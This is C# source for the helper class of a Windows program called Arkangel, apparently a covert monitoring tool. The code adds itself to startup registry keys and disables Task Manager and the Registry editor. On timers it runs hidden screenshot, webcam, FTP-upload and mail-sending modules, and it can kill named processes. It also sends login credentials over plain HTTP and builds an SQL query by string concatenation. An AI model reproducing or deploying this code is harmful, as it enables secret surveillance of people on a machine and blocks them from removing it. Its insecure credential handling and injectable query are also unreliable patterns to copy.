using Ionic.Zip;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows;
using System.Windows.Media.Imaging;

namespace Arkangel
{
    public static class Functions
    {
        public static void AddApplicationToCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }
        public static void AddApplicationToAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("Arkangle", "\"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"");
            }
        }

        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }

        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Arkangle", false);
            }
        }
        public static string Login( string username,string passsword)
        {
            try
            {
                string formUrl = "http://www.arkangel.tk/logginUpload"; // NOTE: This is the URL the form POSTs to, not the URL of the form (you can find this in the "action" attribute of the HTML's form tag
                WebClient wc = new WebClient();
                byte[] resp = wc.UploadValues(formUrl, new System.Collections.Specialized.NameValueCollection
                {
                      {"email",username},
                      {"password",passsword}
                 });
                string _response = Encoding.ASCII.GetString(resp);
                Console.WriteLine(_response);
                return _response;
            }
            catch
            {
                return "Error";
            }
        }
       public static string Gettoken()
        {
            string token="";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {

                   
                    SQLiteCommand sqlCom = new SQLiteCommand(@"SELECT token from current_user", connect);
                    SQLiteDataReader rr = sqlCom.ExecuteReader();
                    while (rr.Read())
                    {
                       token= rr["token"].ToString();
                    }
                }
            }
            return token ;
        }
        public static string GetMail()
        {
            string mail = "";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {

                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT username from Users where id = (select id from current_user)", connect);
                    SQLiteDataReader r = sqlComm.ExecuteReader();
                    while (r.Read())
                    {
                        mail = r["username"].ToString();
                    }
                }
                connect.Close();
            }
            return mail;
        }
        public static bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }
            catch (Exception ex)
            {
                isAdmin = false;
            }
            return isAdmin;
        }

        /// <summary>
        /// Disable or enable task manager. need to restart to confirm
        /// </summary>
        /// <param name="enable"></param> if enable = true => delete registry and restart
        public static void SetTaskManager(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "0", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                }

        }

        // edit group policy to disable Registry editor
        public static void PreventAccessRegistryEditor(bool enable)
        {
            if (enable == true)
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                }
            else
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
                {
                    key.SetValue("DisableRegistryTools", "0", RegistryValueKind.DWord);
                }
            //ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "0", RegistryValueKind.DWord);
        }

        public static void ZipFolder(string dir, string password)
        {
            using (ZipFile zip = new ZipFile())
            {
                if (Directory.Exists(dir))
                {
                    zip.Password = password;
                    zip.AddDirectory(dir + "\\");
                    zip.Save(dir + ".zip");
                }
            }
        }
        //Timer for FTP
        public static void SetTimerFTP(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_scrshot.Elapsed += OnTimedEventFTP;
                MainWindow.aTimer_scrshot.AutoReset = true;
                MainWindow.aTimer_scrshot.Enabled = true;
            }
            catch { }
           
        }
        public static void OnTimedEventFTP(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "ftp.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        // Timer for screenshot
        public static void SetTimerScreenShot(int _time)
        {
            // Create a timer with a two second interval.
            MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
            // Hook up the Elapsed event for the timer. 
            MainWindow.aTimer_scrshot.Elapsed += OnTimedEventScreenShot;
            MainWindow.aTimer_scrshot.AutoReset = true;
            MainWindow.aTimer_scrshot.Enabled = true;
        }
        public static string GetpathScrShot ()
        {
            string path="";
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
                    SQLiteDataReader data = sqlComm.ExecuteReader();
                    while (data.Read())
                    {
                        path = data["screenshotLog"].ToString();
                    }
                }
                connect.Close();
            }
            return path;
        }
        public static void OnTimedEventScreenShot(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "screenshot.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
                
                
                DirectoryInfo d = new DirectoryInfo(GetpathScrShot());//Assuming Test is your Folder
                FileInfo[] Files = d.GetFiles("*.jpeg"); //Getting Text files
                foreach (FileInfo file in Files)
                {
                    List<string> s = new List<string>();
                    s.Add(Gettoken());
                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s); ;
                    var jpeg = new JpegMetadataAdapter(GetpathScrShot()+"\\"+file.Name);
                    //jpeg.Metadata.Comment = token;
                    jpeg.Metadata.Title = "A title";
                    jpeg.Metadata.Author = autho;
                    jpeg.Save();
                    
                }

            }
            catch { }
            try
            {
                ProcessStartInfo startupload = new ProcessStartInfo();
                startupload.WorkingDirectory = @"..\..\module\";
                startupload.FileName = "upScreenshot.exe";
                startupload.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(startupload);
            }
            catch { }
           
        }
        public static void syncUp()
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sync_up.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }
        public static void EndTask(string taskname)
        {
            string processName = taskname;
            string fixstring = taskname.Replace(".exe", "");

            if (taskname.Contains(".exe"))
            {
                foreach (Process process in Process.GetProcessesByName(fixstring))
                {
                    process.Kill();
                }
            }
            else if (!taskname.Contains(".exe"))
            {
                foreach (Process process in Process.GetProcessesByName(processName))
                {
                    process.Kill();
                }
            }
        }
        public static void syncDown()
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sync.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }
        // Timer for Webcam
        public static void SetTimerWebcam(int _time)
        {
            try
            {
                // Create a timer with a two second interval.
                MainWindow.aTimer_webcam = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_webcam.Elapsed += OnTimedEventWebcam;
                MainWindow.aTimer_webcam.AutoReset = true;
                MainWindow.aTimer_webcam.Enabled = true;
            }
            catch { }
          
        }
        public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "webcam.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        // Timer for Send mail
        public static void SetTimerSendMail(int _time)
        {
            try
            {
                MainWindow.aTimer_sendMail = new System.Timers.Timer(_time);
                // Hook up the Elapsed event for the timer. 
                MainWindow.aTimer_sendMail.Elapsed += OnTimedEventSendMail;
                MainWindow.aTimer_sendMail.AutoReset = true;
                MainWindow.aTimer_sendMail.Enabled = true;
            }
            catch { }
            // Create a timer with a two second interval.
           
        }
        public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "sendMail.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        public static void FindUsers()
        {
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT user_list.user FROM user_list,current_user WHERE user_list.id = current_user.id", connect);
                    object re = sqlComm_Alert.ExecuteScalar();
                    if (re == null)
                    {
                        DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
                        DirectoryEntry admGroup = localMachine.Children.Find("administrators", "group");
                        object members = admGroup.Invoke("members", null);
                        foreach (object groupMember in (IEnumerable)members)
                        {
                            DirectoryEntry member = new DirectoryEntry(groupMember);

                            SQLiteCommand sqlConn = new SQLiteCommand(@"INSERT INTO user_list VALUES ((SELECT id FROM current_user),'" + member.Name.ToString() + "')", connect);
                            sqlConn.ExecuteNonQuery();
                        }

                    }
                    connect.Close();
                }
            }
        }

        public static void CheckUser()
        {
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM monitor_user,current_user WHERE monitor_user.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                    while (data.Read())
                    {
                        if (data["enable"].ToString() == "2") //Monitor current user
                        {
                            if (data["current_user"].ToString() != Environment.UserName)
                                Environment.Exit(Environment.ExitCode);
                        }

                        if (data["enable"].ToString() == "3") //Monitor following user
                        {
                            SQLiteCommand sqlConn = new SQLiteCommand(@"SELECT * FROM user_list,current_user WHERE user_list.id = current_user.id", connect);
                            SQLiteDataReader list = sqlConn.ExecuteReader();
                            int flag = 0;
                            while (list.Read())
                            {
                                if (list["user"].ToString() == Environment.UserName)
                                    flag = 1;
                            }

                            if (flag == 0)
                            {
                                Environment.Exit(Environment.ExitCode);
                            }
                        }
                    }
                }
            }
        }


        public static string ComputeHash(string plainText, byte[] saltBytes)
        {
            
            // Convert plain text into a byte array.
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            // Allocate array, which will hold plain text and salt.
            byte[] plainTextWithSaltBytes =  new byte[plainTextBytes.Length + saltBytes.Length];

            // Copy plain text bytes into resulting array.
            for (int i = 0; i < plainTextBytes.Length; i++)
                plainTextWithSaltBytes[i] = plainTextBytes[i];

            // Append salt bytes to the resulting array.
            for (int i = 0; i < saltBytes.Length; i++)
                plainTextWithSaltBytes[plainTextBytes.Length + i] = saltBytes[i];

            // create hash type
            HashAlgorithm hash = new SHA256Managed();

            // Compute hash value of our plain text with appended salt.
            byte[] hashBytes = hash.ComputeHash(plainTextWithSaltBytes);

            // Create array which will hold hash and original salt bytes.
            byte[] hashWithSaltBytes = new byte[hashBytes.Length +   saltBytes.Length];

            // Copy hash bytes into resulting array.
            for (int i = 0; i < hashBytes.Length; i++)
                hashWithSaltBytes[i] = hashBytes[i];

            // Append salt bytes to the result.
            for (int i = 0; i < saltBytes.Length; i++)
                hashWithSaltBytes[hashBytes.Length + i] = saltBytes[i];

            // Convert result into a base64-encoded string.
            string hashValue = Convert.ToBase64String(hashWithSaltBytes);

            // Return the result.
            return hashValue;
        }

        public static bool VerifyHash(string plainText, string hashValue)
        {
            // Convert base64-encoded hash value into a byte array.
            byte[] hashWithSaltBytes = Convert.FromBase64String(hashValue);

            // We must know size of hash (without salt).
            int hashSizeInBits = 256;
            
            // Convert size of hash from bits to bytes.
            int hashSizeInBytes = hashSizeInBits / 8;

            // Make sure that the specified hash value is long enough.
            if (hashWithSaltBytes.Length < hashSizeInBytes)
                return false;

            // Allocate array to hold original salt bytes retrieved from hash.
            byte[] saltBytes = new byte[hashWithSaltBytes.Length - hashSizeInBytes];

            // Copy salt from the end of the hash to the new array.
            for (int i = 0; i < saltBytes.Length; i++)
                saltBytes[i] = hashWithSaltBytes[hashSizeInBytes + i];

            // Compute a new hash string.
            string expectedHashString = ComputeHash(plainText, saltBytes);

            // If the computed hash matches the specified hash,
            // the plain text value must be correct.
            Console.WriteLine("hash value: " + hashValue);
            Console.WriteLine("hash expected : " + expectedHashString);
            return (hashValue == expectedHashString);
        }
        public static Image SetImageComment(Image image, string comment)
        {
            using (var memStream = new MemoryStream())
            {
                image.Save(memStream, ImageFormat.Jpeg);
                memStream.Position = 0;
                var decoder = new JpegBitmapDecoder(memStream, BitmapCreateOptions.PreservePixelFormat, BitmapCacheOption.OnLoad);
                BitmapMetadata metadata;
                if (decoder.Metadata == null)
                {
                    metadata = new BitmapMetadata("jpg");
                }
                else
                {
                    metadata = decoder.Metadata;
                }

                metadata.Comment = comment;

                var bitmapFrame = decoder.Frames[0];
                BitmapEncoder encoder = new JpegBitmapEncoder();
                encoder.Frames.Add(BitmapFrame.Create(bitmapFrame, bitmapFrame.Thumbnail, metadata, bitmapFrame.ColorContexts));

                var imageStream = new MemoryStream();
                encoder.Save(imageStream);
                imageStream.Position = 0;
                image.Dispose();
                image = null;
                return Image.FromStream(imageStream);
            }
        }
    }
}
